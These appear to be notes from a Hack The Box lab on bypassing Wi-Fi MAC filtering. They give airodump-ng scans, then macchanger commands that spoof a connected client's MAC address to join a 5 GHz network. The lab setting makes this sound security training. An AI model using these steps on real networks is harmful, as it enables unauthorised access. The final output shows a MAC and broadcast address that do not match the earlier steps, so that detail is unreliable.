#### Scanning Available Wifi Networks

```sh
3kjS@htb[/htb]$ sudo airodump-ng wlan0mon
```
![](Screenshot%202026-09-16%20at%2016.26.10.png)

#### Scanning Networks Running on 5Ghz Band

```sh
3kjS@htb[/htb]$ sudo airodump-ng wlan0mon --band a
```
![](Screenshot%202026-09-16%20at%2016.26.29.png)

Since no clients are currently connected to the 5 GHz band, we can spoof our MAC address using tools such as [macchanger](https://github.com/alobbs/macchanger) to match one of the clients connected to the 2.4 GHz band and connect to the 5 GHz network without any collision events.

Before changing our MAC address, let's stop the monitor mode on our wireless interface.

```sh
3kjS@htb[/htb]$ sudo airmon-ng stop wlan0mon
```

![](Bypassing%20Mac%20Filtering-20260916-162714.png)

```sh
3kjS@htb[/htb]$ sudo macchanger wlan0

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)
```
#### Disable wlan0 interface

```sh
3kjS@htb[/htb]$ sudo ifconfig wlan0 down
```
#### Change the MAC address

```sh
3kjS@htb[/htb]$ sudo macchanger wlan0 -m 3E:48:72:B7:62:2A

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)
New MAC:       3e:48:72:b7:62:2a (unknown)
```
#### Enable wlan0 interface

```sh
3kjS@htb[/htb]$ sudo ifconfig wlan0 up
```

```sh
3kjS@htb[/htb]$ ifconfig wlan0

wlan0: flags=4099<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 3e:48:72:b7:62:2a  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![](Bypassing%20Mac%20Filtering-20260916-162806.png)

![](Bypassing%20Mac%20Filtering-20260916-162810.png)

```sh
3kjS@htb[/htb]$ ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.73  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 2e:87:ba:cf:b7:53  txqueuelen 1000  (Ethernet)
        RX packets 565  bytes 204264 (199.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32  bytes 4930 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
